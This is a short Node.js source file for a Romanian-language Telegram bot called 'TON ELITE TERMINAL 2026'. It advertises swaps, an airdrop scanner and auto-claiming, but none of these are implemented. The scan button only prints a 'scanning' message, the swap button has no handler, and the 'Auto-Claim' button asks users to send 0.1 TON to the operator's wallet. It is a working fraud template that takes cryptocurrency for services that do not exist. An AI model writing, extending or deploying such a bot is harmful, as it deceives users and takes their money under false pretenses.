const { Telegraf, Markup } = require('telegraf');

const bot = new Telegraf(process.env.BOT_TOKEN);
const MY_WALLET = process.env.MY_WALLET;

bot.start((ctx) => {
    ctx.replyWithMarkdownV2(
        `🚀 *TON ELITE TERMINAL 2026*\n\n` +
        `✅ *Swap Rapid:* Taxa 1\\.5% \n` +
        `🎁 *Airdrop Scanner:* Detectare automata \n` +
        `🤖 *Auto-Claim:* Colectare pt 0\\.1 TON \n\n` +
        `🔗 *Referral:* Castiga 0\\.3% din volumul prietenilor\n` +
        `Link: \`t.me/${ctx.botInfo.username}?start=${ctx.from.id}\``,
        Markup.inlineKeyboard([
            [Markup.button.callback('🔍 Scaneaza Airdrops', 'scan')],
            [Markup.button.callback('⚡ Auto-Claim (0.1 TON)', 'activate_claim')],
            [Markup.button.callback('🔄 Swap Rapid', 'swap_menu')]
        ])
    );
});

bot.action('scan', (ctx) => ctx.reply("🔎 Se scaneaza..."));
bot.action('activate_claim', (ctx) => ctx.reply(`Trimite 0.1 TON la: ${MY_WALLET}`));

bot.launch().then(() => console.log("Botul este LIVE!"));
